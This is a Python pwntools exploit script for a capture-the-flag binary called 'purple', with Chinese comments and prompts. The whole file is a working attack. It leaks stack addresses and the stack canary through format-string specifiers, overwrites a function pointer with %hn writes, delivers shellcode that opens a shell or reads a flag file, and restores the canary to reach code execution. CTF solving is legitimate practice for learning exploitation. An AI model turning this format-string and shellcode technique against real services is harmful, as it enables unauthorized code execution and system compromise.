#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spark pwn - purple  (老东西，你的替身是最没用哒！)  exp v2"""
import os

from pwn import *

context.arch = "amd64"
context.log_level = "info"
context.timeout = 10

HERE = os.path.dirname(os.path.abspath(__file__))

SHELL_AREA = 0x406000
FMT_FROM_RBP = 0x210
JOB_FROM_RBP = 0x220
CANARY_FROM_BUF = FMT_FROM_RBP - 0x8
JOB_TO_BUF = JOB_FROM_RBP - FMT_FROM_RBP
DEFAULT_BUF_IDX = 8

PROMPT_1 = "第一句：".encode()
PROMPT_2 = "第二句：".encode()
PROMPT_3 = "请写入你要显现的内容：".encode()
PROMPT_SIG = "最后请交回签名页：".encode()

LEAK_IDXS = [1, 6, 7, 8, 9] + list(range(70, 79))


def build_stage1():
    return b"|".join(b"%%%d$p" % i for i in LEAK_IDXS)


def build_stage2(buf_addr, buf_idx=DEFAULT_BUF_IDX):
    job_addr = buf_addr - JOB_TO_BUF
    lo_addr, hi_addr = job_addr, job_addr + 2
    lo_val = SHELL_AREA & 0xFFFF
    hi_val = (SHELL_AREA >> 16) & 0xFFFF
    i_hi = i_lo = buf_idx
    for _ in range(16):
        body = b"%%1$%dc%%%d$hn" % (hi_val, i_hi)
        body += b"%%1$%dc%%%d$hn" % (lo_val - hi_val, i_lo)
        body += b"A" * ((-len(body)) % 8)
        off_hi = len(body)
        n_hi = buf_idx + off_hi // 8
        n_lo = buf_idx + (off_hi + 8) // 8
        if (n_hi, n_lo) == (i_hi, i_lo):
            break
        i_hi, i_lo = n_hi, n_lo
    else:
        raise RuntimeError("index fixpoint failed")
    return body + p64(hi_addr) + p64(lo_addr), job_addr, (i_hi, i_lo)


def build_payload_bytes(flag_path=None):
    if flag_path:
        return asm(
            shellcraft.amd64.linux.open(flag_path, 0)
            + shellcraft.amd64.linux.read("rax", "rsp", 0x100)
            + shellcraft.amd64.linux.write(1, "rsp", 0x100)
        )
    return asm(shellcraft.amd64.linux.sh())


def parse_leak(line, s1):
    vals = [int(x, 16) for x in line.split(b"|")]
    table = dict(zip(LEAK_IDXS, vals))
    buf_addr = table[1]
    word0 = u64(s1[:8].ljust(8, b"\x00"))
    buf_idx = DEFAULT_BUF_IDX
    for i in (8, 7, 9, 6):
        if table.get(i) == word0:
            buf_idx = i
            log.success("format[0] 是第 %d 个可变参数", buf_idx)
            break
    else:
        log.warning("参数序号未确认, 用默认 %d", DEFAULT_BUF_IDX)
    if table.get(6) == 0x4011B6:
        log.success("arg6 == print_job(0x4011b6), 栈布局确认")
    canary_idx = buf_idx + CANARY_FROM_BUF // 8
    canary = table.get(canary_idx)
    if canary is None or canary & 0xFF:
        log.warning("canary 序号 %d 不可信: %s", canary_idx, canary)
        cand = [v for k, v in table.items() if k >= buf_idx + 55 and (v & 0xFF) == 0]
        if not cand:
            raise RuntimeError("canary not found")
        canary = cand[0]
    return buf_addr, buf_idx, canary


def start():
    if args.REMOTE:
        host, port = args.REMOTE.split(":")
        return remote(host, int(port))
    ld = os.path.join(HERE, "ld-linux-x86-64.so.2")
    exe = [ld, "--library-path", HERE, os.path.join(HERE, "purple")]
    return process(exe, cwd=HERE)


def exploit(io):
    s1 = build_stage1()
    io.recvuntil(PROMPT_1)
    io.sendline(s1)
    while True:
        line = io.recvline()
        if line.startswith(b"0x") and b"|" in line:
            break
    log.info("leak %s", line.strip().decode("latin-1"))
    buf_addr, buf_idx, canary = parse_leak(line.strip(), s1)
    main_rbp = buf_addr + FMT_FROM_RBP
    log.success("&format=%#x main_rbp=%#x canary=%#x", buf_addr, main_rbp, canary)

    io.recvuntil(PROMPT_2)
    payload, job_addr, idxs = build_stage2(buf_addr, buf_idx)
    log.info("write [%#x] <- %#x via args %s", job_addr, SHELL_AREA, idxs)
    io.sendline(payload)
    io.recvuntil(PROMPT_3)
    log.success("print_job -> shell_area")

    sc = build_payload_bytes(args.ORW or None)
    io.send(sc.ljust(1024, b"\x90"))
    log.success("%d bytes of code at %#x", len(sc), SHELL_AREA)

    # note[64] 在 rbp-0x50，read_exact 读 0x50=80 字节 -> [rbp-0x50, rbp-1]
    #   字节 0..63  : note[64]
    #   字节 64..71 : 填充空洞 (rbp-0x10..rbp-0x9)
    #   字节 72..79 : canary (rbp-0x8)   <- 只有这里要填真值
    # saved rbp 在 rbp+0，写不到，所以 main 的 rbp 天然是好的
    io.recvuntil(PROMPT_SIG)
    io.send(b"A" * 72 + p64(canary))
    log.success("canary restored (72 filler + canary), waiting for call rax")

    if args.ORW:
        data = io.recvrepeat(2)
        print(data.decode("latin-1"))
        return data
    io.sendline(b"echo PWNED_$((1+1))")
    try:
        io.recvuntil(b"PWNED_2", timeout=5)
        log.success("shell ok")
        io.interactive()
    except EOFError:
        log.failure("no shell")
    return io


if __name__ == "__main__":
    exploit(start())
